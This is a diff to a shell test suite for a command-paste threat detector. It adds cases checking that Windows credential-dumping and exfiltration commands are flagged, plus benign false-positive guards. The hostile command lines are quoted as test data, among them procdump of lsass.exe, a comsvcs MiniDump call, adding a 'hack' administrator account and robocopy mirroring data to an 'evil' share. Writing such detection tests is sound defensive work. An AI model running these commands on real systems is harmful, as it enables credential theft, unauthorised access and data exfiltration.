@@ -11671,6 +11671,32 @@ check "url: cydia flagged" "$(./hlse_core 'cydia://evil' | head -1 | grep -c 'LO
     && check "secret FP guard: ssws prose clean" "0" "0" \
     || check "secret FP guard: ssws prose clean" "0" "1"
 
+# ── cycle-222: LSASS-dump + account/exfil LOLBin wave ────────────────
+for c in \
+    'procdump -ma lsass.exe out.dmp' \
+    'rundll32 comsvcs.dll, MiniDump 1234 dump.bin' \
+    'tsecimp -f evil.xml' \
+    'Microsoft.Workflow.Compiler.exe input.xoml output.txt' \
+    'pnputil -i -a evil.inf' \
+    'net user hack P@ss /add' \
+    'net localgroup administrators hack /add' \
+    'net share c$=c:\' \
+    'net use \\evil.com\share' \
+    'ftp -s:script.txt' \
+    'iexpress /n x.sed' \
+    'robocopy c:\data \\evil\share /mir'; do
+    ./hlse_core paste "$c" 2>&1 | grep -qE 'ALERT|BLOCK|ISOLATE' \
+        && check "paste: $c flagged" "0" "0" \
+        || check "paste: $c flagged" "0" "1"
+done
+for c in 'procdump -h' 'pnputil /enum-drivers' 'net user administrator' \
+         'net share' 'net use' 'ftp evil.com' \
+         'robocopy c:\data c:\backup /mir' 'iexpress'; do
+    ./hlse_core paste "$c" 2>&1 | grep -q '^OK' \
+        && check "paste FP guard: $c clean" "0" "0" \
+        || check "paste FP guard: $c clean" "0" "1"
+done
+
 # ── cycle-221: ntdsutil/LOLBin wave-5 + cred-config files + robocall ─
 for c in \
     'ntdsutil "ac i ntds" "ifm" "create full c:\\t" q q' \
